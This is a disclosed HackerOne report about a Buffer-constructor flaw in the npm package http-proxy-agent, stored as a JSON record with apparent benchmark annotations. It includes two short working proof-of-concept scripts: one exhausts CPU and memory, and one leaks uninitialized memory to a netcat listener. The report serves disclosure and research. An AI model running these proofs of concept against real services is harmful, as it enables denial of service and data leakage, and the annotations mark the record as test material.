{
  "reported_to": "Node.js third-party modules",
  "reported_by": "chalker ",
  "title": "`http-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak",
  "content": "\nI would like to report a Buffer allocation vulnerability in http-proxy-agent.\nIn setups where auth argument is user-controlled, it allows to:\ncause Denial of Service by trivially consuming all the available CPU resources\nextract uninitialized memory chunks from the server on Node.js <8.x.\n# Module\nmodule name: http-proxy-agent\nversion: 2.0.0\nnpm page: https://www.npmjs.com/package/http-proxy-agent\nModule Description\nThis module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in http module.\nModule Stats\n112 721 downloads in the last day\n707 979 downloads in the last week\n2 953 077 downloads in the last month\nVulnerability\nVulnerability Description\nhttp-proxy-agent passes auth option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).\nThe exact line: https://github.com/TooTallNate/node-http-proxy-agent/blob/master/index.js#L80\nSteps To Reproduce:\nDoS\nCode 427 Bytes\n1var url = require('url');\n2var http = require('http');\n3var HttpProxyAgent = require('http-proxy-agent');\n4\n5var proxy = {\n6  protocol: 'http:',\n7  host: \"127.0.0.1\",\n8  port: 8080\n9};\n10\n11setInterval(() => {\n12  proxy.auth = 1e9; // a number as 'auth'\n13  var opts = url.parse('http://example.com/');\n14  var agent = new HttpProxyAgent(proxy);\n15  opts.agent = agent;\n16  console.time('tick');\n17  http.get(opts);\n18  console.timeEnd('tick');\n19}, 200);\nObserve how this is consuming memory and CPU \u2014 each request takes >1 second in the main thread on my setup.\nUninitialized memory leak\nCode 368 Bytes\n1// listen with: nc -l -p 8080\n2\n3var url = require('url');\n4var http = require('http');\n5var HttpProxyAgent = require('http-proxy-agent');\n6\n7var proxy = {\n8  protocol: 'http:',\n9  host: \"127.0.0.1\",\n10  port: 8080\n11};\n12\n13proxy.auth = 500; // a number as 'auth'\n14var opts = url.parse('http://example.com/');\n15var agent = new HttpProxyAgent(proxy);\n16opts.agent = agent;\n17http.get(opts);\nListen with nl -l -p 8080 to see requests.\nExecute on various Node.js versions \u2014 4.x LTS, 6.x LTS, 8.x LTS / 9.x.\nThis leaks uninitialized Buffer memory on Node.js <8.x.\nOn \u22658.x those Buffers (that are using the deprecated API) are zero-filled.\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nOS: Arch Linux current\nNode.js 9.5.0\nnpm 5.6.0\ngnu-netcat 0.7.1\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nNote\nAlmost entirely similar to https-proxy-agent, but this is a separate package, a separate GitHub repo, different version numbers, different lines in code, different download stats.\nImpact\nDenial of service\nSensitive data leak (on Node.js <8.0)\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1522979460,
  "report_url": "https://hackerone.com/reports/321631",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a proxy configuration with a malicious 'auth' parameter (e.g., a very large number or a specific value to trigger memory leaks)."
    ],
    [
      2,
      "Use the http-proxy-agent to make HTTP requests through the configured proxy, observing CPU/memory consumption or leaked data."
    ]
  ],
  "vuln_description": "The http-proxy-agent module passes unsanitized 'auth' options directly to the Buffer constructor, leading to Denial of Service (DoS) via CPU exhaustion and uninitialized memory leaks in Node.js versions <8.x. This occurs when user-controlled input (e.g., from JSON) is passed to the 'auth' parameter.",
  "reason": "The vulnerability involves a straightforward misuse of the Buffer constructor, a well-documented pitfall in Node.js. The attack requires minimal setup (controlling the 'auth' parameter) and leverages known behavior in older Node.js versions. No complex interactions or novel logic are involved.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}